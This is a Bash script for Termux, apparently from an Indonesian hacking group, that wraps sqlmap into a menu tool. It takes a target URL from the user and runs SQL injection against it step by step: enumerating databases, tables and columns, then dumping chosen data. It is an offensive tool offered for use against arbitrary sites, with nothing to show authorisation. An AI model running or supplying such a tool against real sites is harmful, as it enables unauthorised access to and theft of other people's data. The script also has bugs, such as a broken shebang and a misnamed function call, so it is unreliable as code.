!/data/data/com.termux/files/usr/bin/bash
clear
#colors
blue='\e[1;34m'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
grey="\033[0;37m"
purple="\033[0;35m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
mon="mon"
lightcyan='\e[96m'
white='\e[1;37m'
nc="\e[0m"
red='\e[1;31m'
yellow='\e[1;33m'
DEFAULT_ROUTE=$(ip route show default | awk '/default/ {print $3}')
MYIP=$(ip route show | awk '(NR == 2) {print $9}')

#LOGO
function author()
{ 
     sleep 0.25
     clear
     echo ""
     echo -e "$red"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"                     
     sleep 0.25
     clear
     echo ""
     echo -e "$white"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"                                          
      sleep 0.25
     clear
     echo ""
     echo -e "$grey"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"     
     sleep 0.25
     clear
     echo ""
     echo -e "$purple"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"  
     sleep 0.25
     clear
     echo ""
     echo -e "$green"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"     
     sleep 0.25
     clear
     sleep 0.25
     clear
     echo ""
     echo -e "$yellow"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"     
     sleep 0.25
     clear
     echo ""
     echo -e "$cyan"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"    
     sleep 0.25
     clear
     echo ""
     echo -e "$Cafe"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"      
     sleep 0.25
     clear
     echo ""
     echo -e "$blue"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"    
     sleep 0.25
     clear
     echo ""
     echo -e "$Fiuscha"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"     
     sleep 0.25
     clear
     echo ""
     echo -e "$blue"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"  
     sleep 0.25
     clear
     echo ""
     echo -e "$red"
     echo "                    ============================= "
     echo "                           _____ ____  ____       "
     echo "                          |_   _|  _ \/ ___|      "
     echo "                            | | | | | \___ \      "
     echo "                            | | | |_| |___) |     "
     echo "                            |_| |____/|____/  V 1.0.0 "
     echo "                    ============================= "
     echo -e "$nc"           
     echo ""
     echo -e "           Gateway:\033[32m$DEFAULT_ROUTE |$white My-Ip:$red$MYIP"
}
function target()
{
    echo ""
    echo -e "$lightgreen"
    echo ""
    echo "                      ~~~~~[+] MASUKIN TARGET [+]~~~~~ "
    echo ""
    read -p "   Target:~# " target
}
function sql()
{
    echo ""
    echo "$red"
    echo "              ~~~~~[*] Sql injection Sedang berjalan ... [*]~~~~~ "
    echo ""
    python2 sqlmap.py -u $target --dbs
}
function tables()
{
    echo ""
    echo "$blue"
    echo "                ~~~~~[*] Masukan TableNya ... [*]~~~~~  "
    echo ""
    read -p "   Choose Table:~# " tbl
    echo ""
    python2 sqlmap.py -u $target -D $tbl --tables
}
function colums()
{
    echo ""
    echo "$yellow"
    echo "                  ~~~~~[*] Masukan ColumnsNya ... [*]~~~~~ "
    echo ""
    read -p "   Choose Columns:~# " clm
    echo ""
    python2 sqlmap.py -u $target -D $tbl -T $clm --columns
}
function dump()
{
    echo ""
    echo "$red"
    echo "                   ~~~~~[*] Masukan Data Yang Ingin Di liat / Di Dump ... [*]~~~~~ "
    echo ""
    read -p "    Choose Data:~# " dmp
    echo ""
    python2 sqlmap.py -u $target -D $tbl -T $clm -C $dmp --dump
}

clear
chmod +x sqlmap.py
clear
author
target 
sql
tables
columns
dump

###################################################
# CTRL C
###################################################
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[#]> (Ctrl + C ) Detected, Trying To Exit ... "
sleep 1
echo ""
echo -e $green"[#]> Terima kasih sudah make tools saya ... "
sleep 1
echo ""
echo -e $white"[#]> This Is My Tools No CopyRight ... "
echo ""
echo -e $lightgreen"[#]> We Are Indonesia Cyber Team!!! "
sleep 0.25
exit
}


